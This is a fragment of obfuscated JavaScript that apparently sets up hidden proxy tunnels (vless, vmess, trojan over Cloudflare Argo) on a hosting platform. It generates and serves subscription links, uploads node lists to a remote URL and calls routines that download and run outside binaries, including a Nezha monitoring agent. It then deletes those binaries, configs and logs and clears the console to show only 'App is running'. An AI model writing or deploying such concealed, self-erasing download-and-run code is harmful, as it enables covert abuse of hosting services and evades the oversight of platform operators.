_0x12fee3={_0x3f87db:0x271,_0x35fedd:0x23a},_0x1bde01=_0x58aa,_0x2536e7={'v':'2','ps':''+_0x3e64fb,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x1bde01(0x25e),'net':'ws','type':_0x1bde01(0x25e),'host':_0x49cbf7,'path':'/vmess-argo?ed=2560','tls':_0x1bde01(0x27c),'sni':_0x49cbf7,'alpn':'','fp':_0x1bde01(_0x5773e1._0xcf1b25)},_0x1cc4ff='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x1bde01(0x1fc)+_0x49cbf7+'&fp=firefox&type=ws&host='+_0x49cbf7+_0x1bde01(_0x5773e1._0x12a901)+_0x3e64fb+_0x1bde01(_0x5773e1._0x82ca69)+Buffer[_0x1bde01(_0x5773e1._0x4de5b1)](JSON[_0x1bde01(_0x5773e1._0x4e632a)](_0x2536e7))[_0x1bde01(0x265)](_0x1bde01(_0x5773e1._0x1c78b1))+_0x1bde01(0x20b)+UUID+'@'+CFIP+':'+CFPORT+_0x1bde01(0x1f8)+_0x49cbf7+'&fp=firefox&type=ws&host='+_0x49cbf7+_0x1bde01(0x1d7)+_0x3e64fb+_0x1bde01(0x1ed);console['log'](Buffer[_0x1bde01(0x271)](_0x1cc4ff)['toString']('base64')),fs[_0x1bde01(0x220)](subPath,Buffer[_0x1bde01(0x271)](_0x1cc4ff)[_0x1bde01(_0x5773e1._0x103560)]('base64')),console[_0x1bde01(0x241)](FILE_PATH+_0x1bde01(0x234)),uploadNodes(),app[_0x1bde01(_0x5773e1._0x4f27f8)]('/'+SUB_PATH,(_0x221278,_0x1ed4bd)=>{const _0x371494=_0x1bde01,_0x5e90f2=Buffer[_0x371494(_0x12fee3._0x3f87db)](_0x1cc4ff)[_0x371494(0x265)](_0x371494(0x27a));_0x1ed4bd[_0x371494(_0x12fee3._0x35fedd)]('Content-Type','text/plain;\x20charset=utf-8'),_0x1ed4bd['send'](_0x5e90f2);}),_0x42c93d(_0x1cc4ff);},0x7d0);});}}async function uploadNodes(){const _0x4f9c39={_0x368091:0x25f,_0x143195:0x251,_0x1d0545:0x210,_0x3724d6:0x268,_0x146e74:0x1f0,_0x4cc16e:0x237,_0x2214a2:0x1d5,_0x2b8a57:0x249,_0x55cbc6:0x1bb},_0xc37717=_0x2b4b5b;if(UPLOAD_URL&&PROJECT_URL){const _0x300e69=PROJECT_URL+'/'+SUB_PATH,_0x5b18f={'subscription':[_0x300e69]};try{const _0x3712d8=await axios[_0xc37717(_0x4f9c39._0x368091)](UPLOAD_URL+_0xc37717(_0x4f9c39._0x143195),_0x5b18f,{'headers':{'Content-Type':_0xc37717(_0x4f9c39._0x1d0545)}});return _0x3712d8&&_0x3712d8['status']===0xc8?(console['log'](_0xc37717(0x1d1)),_0x3712d8):null;}catch(_0x54f679){if(_0x54f679[_0xc37717(0x1ec)]){if(_0x54f679[_0xc37717(0x1ec)][_0xc37717(_0x4f9c39._0x3724d6)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0xc37717(_0x4f9c39._0x146e74)](listPath))return;const _0xddd564=fs[_0xc37717(_0x4f9c39._0x4cc16e)](listPath,'utf-8'),_0x39f58c=_0xddd564[_0xc37717(0x23d)]('\x0a')['filter'](_0x29547b=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xc37717(0x279)](_0x29547b));if(_0x39f58c['length']===0x0)return;const _0x5222de=JSON[_0xc37717(_0x4f9c39._0x2214a2)]({'nodes':_0x39f58c});try{const _0x5ad330=await axios[_0xc37717(_0x4f9c39._0x368091)](UPLOAD_URL+_0xc37717(_0x4f9c39._0x2b8a57),_0x5222de,{'headers':{'Content-Type':_0xc37717(0x210)}});return _0x5ad330&&_0x5ad330['status']===0xc8?(console['log'](_0xc37717(_0x4f9c39._0x55cbc6)),_0x5ad330):null;}catch(_0x57165c){return null;}}else return;}}function cleanFiles(){const _0x56c231={_0x5aad1e:0x216,_0x11ac8d:0x1dd,_0x10c4a6:0x1db},_0x2ba2a1={_0x4ab44f:0x241,_0x4fcb12:0x1ea};setTimeout(()=>{const _0x101ba6={_0x5be6f9:0x1f3,_0x547326:0x1ea},_0x11ccdb=_0x58aa,_0x1f0b1f=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x1f0b1f['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x1f0b1f[_0x11ccdb(0x1e8)](phpPath);process['platform']===_0x11ccdb(0x1e6)?exec(_0x11ccdb(_0x56c231._0x5aad1e)+_0x1f0b1f['join']('\x20')+'\x20>\x20nul\x202>&1',_0x1ccc32=>{const _0x521110=_0x11ccdb;console[_0x521110(_0x101ba6._0x5be6f9)](),console[_0x521110(0x241)](_0x521110(0x1c2)),console[_0x521110(0x241)](_0x521110(_0x101ba6._0x547326));}):exec(_0x11ccdb(_0x56c231._0x11ac8d)+_0x1f0b1f[_0x11ccdb(_0x56c231._0x10c4a6)]('\x20')+'\x20>/dev/null\x202>&1',_0x2f8260=>{const _0x37bc07=_0x11ccdb;console['clear'](),console[_0x37bc07(_0x2ba2a1._0x4ab44f)]('App\x20is\x20running'),console[_0x37bc07(0x241)](_0x37bc07(_0x2ba2a1._0x4fcb12));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x350477={_0x1c6e23:0x256,_0x3cd390:0x207,_0x233322:0x213,_0x5e2274:0x273},_0x220baf=_0x2b4b5b;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x220baf(0x241)](_0x220baf(_0x350477._0x1c6e23));return;}try{const _0x1b6920=await axios['post'](_0x220baf(0x1e7),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console['log'](_0x220baf(_0x350477._0x3cd390)),_0x1b6920;}catch(_0x1e1d36){return console['error'](_0x220baf(_0x350477._0x233322)+_0x1e1d36[_0x220baf(_0x350477._0x5e2274)]),null;}}async function startserver(){const _0x5131ca=_0x2b4b5b;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x16e49a){console[_0x5131ca(0x1fe)]('Error\x20in\x20startserver:',_0x16e49a);}}startserver()[_0x2b4b5b(0x228)](_0x7f6302=>{const _0x3feb2b=_0x2b4b5b;console[_0x3feb2b(0x1fe)](_0x3feb2b(0x260),_0x7f6302);}),app[_0x2b4b5b(0x1ff)](PORT,()=>console[_0x2b4b5b(0x241)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
